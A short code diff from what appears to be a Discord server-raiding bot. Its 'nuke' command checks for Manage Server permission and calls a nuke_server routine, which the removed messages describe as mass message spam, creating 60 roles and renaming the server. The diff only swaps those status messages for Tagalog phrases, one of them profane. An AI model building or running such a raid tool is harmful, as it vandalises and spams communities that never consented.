@@ -214,8 +214,8 @@ async def nuke(ctx):
     # Double-check bot permissions
     me = ctx.guild.me
     if not me.guild_permissions.manage_guild:
-        await ctx.send("⚠️ Bot lacks 'Manage Server' permission. Server rename will fail. Please grant it.")
-    await ctx.send("💣 Nuking server in progress... (200 messages per channel, 60 roles, server rename)")
+        await ctx.send("ang pogi ko")
+    await ctx.send("eto na putangina")
     await nuke_server(ctx.guild)
 
 @bot.command(name="config")
